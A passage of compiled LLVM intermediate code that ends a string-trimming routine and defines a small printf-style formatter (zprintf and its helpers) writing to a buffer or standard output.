  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !5
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !5
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !8, !noalias !5
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !8, !noalias !5
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !10

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !5
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !5
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !8, !noalias !5
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !8, !noalias !5
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !5
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !5
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !8, !noalias !5
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !8, !noalias !5
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !5
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !5
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !8, !noalias !5
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !8, !noalias !5
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !5
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !5
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !8, !noalias !5
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !8, !noalias !5
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !12

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #14
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !13

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %138, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %138 ]
  %.0 = phi i8* [ %1, %3 ], [ %139, %138 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %134 [
    i8 0, label %140
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %140
    i8 37, label %134
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %138 [
    i8 115, label %33
    i8 100, label %53
    i8 120, label %69
    i8 88, label %85
    i8 117, label %101
    i8 99, label %117
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i32*
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = inttoptr i64 %47 to i8*
  %49 = icmp ne i32 %46, 0
  %50 = select i1 %49, i8* %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.327, i64 0, i64 0)
  %51 = tail call fastcc i32 @prints(i8** %0, i8* %50, i32 %.064.lcssa, i32 %.063.lcssa)
  %52 = add nsw i32 %51, %.061
  br label %138

; <label>:53:                                     ; preds = %.critedge
  %54 = load i32, i32* %5, align 8
  %55 = icmp ult i32 %54, 41
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %6, align 8
  %58 = sext i32 %54 to i64
  %59 = getelementptr i8, i8* %57, i64 %58
  %60 = add i32 %54, 8
  store i32 %60, i32* %5, align 8
  br label %64

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr i8, i8* %62, i64 8
  store i8* %63, i8** %7, align 8
  br label %64

; <label>:64:                                     ; preds = %61, %56
  %.in68 = phi i8* [ %59, %56 ], [ %62, %61 ]
  %65 = bitcast i8* %.in68 to i32*
  %66 = load i32, i32* %65, align 4
  %67 = tail call fastcc i32 @printi(i8** %0, i32 %66, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %68 = add nsw i32 %67, %.061
  br label %138

; <label>:69:                                     ; preds = %.critedge
  %70 = load i32, i32* %5, align 8
  %71 = icmp ult i32 %70, 41
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %6, align 8
  %74 = sext i32 %70 to i64
  %75 = getelementptr i8, i8* %73, i64 %74
  %76 = add i32 %70, 8
  store i32 %76, i32* %5, align 8
  br label %80

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr i8, i8* %78, i64 8
  store i8* %79, i8** %7, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %72
  %.in67 = phi i8* [ %75, %72 ], [ %78, %77 ]
  %81 = bitcast i8* %.in67 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = tail call fastcc i32 @printi(i8** %0, i32 %82, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %84 = add nsw i32 %83, %.061
  br label %138

; <label>:85:                                     ; preds = %.critedge
  %86 = load i32, i32* %5, align 8
  %87 = icmp ult i32 %86, 41
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %85
  %89 = load i8*, i8** %6, align 8
  %90 = sext i32 %86 to i64
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = add i32 %86, 8
  store i32 %92, i32* %5, align 8
  br label %96

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr i8, i8* %94, i64 8
  store i8* %95, i8** %7, align 8
  br label %96

; <label>:96:                                     ; preds = %93, %88
  %.in66 = phi i8* [ %91, %88 ], [ %94, %93 ]
  %97 = bitcast i8* %.in66 to i32*
  %98 = load i32, i32* %97, align 4
  %99 = tail call fastcc i32 @printi(i8** %0, i32 %98, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %100 = add nsw i32 %99, %.061
  br label %138

; <label>:101:                                    ; preds = %.critedge
  %102 = load i32, i32* %5, align 8
  %103 = icmp ult i32 %102, 41
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %101
  %105 = load i8*, i8** %6, align 8
  %106 = sext i32 %102 to i64
  %107 = getelementptr i8, i8* %105, i64 %106
  %108 = add i32 %102, 8
  store i32 %108, i32* %5, align 8
  br label %112

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr i8, i8* %110, i64 8
  store i8* %111, i8** %7, align 8
  br label %112

; <label>:112:                                    ; preds = %109, %104
  %.in65 = phi i8* [ %107, %104 ], [ %110, %109 ]
  %113 = bitcast i8* %.in65 to i32*
  %114 = load i32, i32* %113, align 4
  %115 = tail call fastcc i32 @printi(i8** %0, i32 %114, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %116 = add nsw i32 %115, %.061
  br label %138

; <label>:117:                                    ; preds = %.critedge
  %118 = load i32, i32* %5, align 8
  %119 = icmp ult i32 %118, 41
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %117
  %121 = load i8*, i8** %6, align 8
  %122 = sext i32 %118 to i64
  %123 = getelementptr i8, i8* %121, i64 %122
  %124 = add i32 %118, 8
  store i32 %124, i32* %5, align 8
  br label %128

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr i8, i8* %126, i64 8
  store i8* %127, i8** %7, align 8
  br label %128

; <label>:128:                                    ; preds = %125, %120
  %.in = phi i8* [ %123, %120 ], [ %126, %125 ]
  %129 = bitcast i8* %.in to i32*
  %130 = load i32, i32* %129, align 4
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %132 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %133 = add nsw i32 %132, %.061
  br label %138

; <label>:134:                                    ; preds = %12, %10
  %135 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %136 = zext i8 %135 to i32
  tail call fastcc void @printchar(i8** %0, i32 %136)
  %137 = add nsw i32 %.061, 1
  br label %138

; <label>:138:                                    ; preds = %.critedge, %134, %128, %112, %96, %80, %64, %44
  %.162 = phi i32 [ %137, %134 ], [ %52, %44 ], [ %68, %64 ], [ %84, %80 ], [ %100, %96 ], [ %116, %112 ], [ %133, %128 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %134 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %64 ], [ %.2.lcssa, %80 ], [ %.2.lcssa, %96 ], [ %.2.lcssa, %112 ], [ %.2.lcssa, %128 ], [ %.2.lcssa, %.critedge ]
  %139 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:140:                                    ; preds = %12, %10
  %141 = icmp eq i8** %0, null
  br i1 %141, label %144, label %142

; <label>:142:                                    ; preds = %140
  %143 = load i8*, i8** %0, align 8
  store i8 0, i8* %143, align 1
  br label %144

; <label>:144:                                    ; preds = %140, %142
  %145 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %145)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #7
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

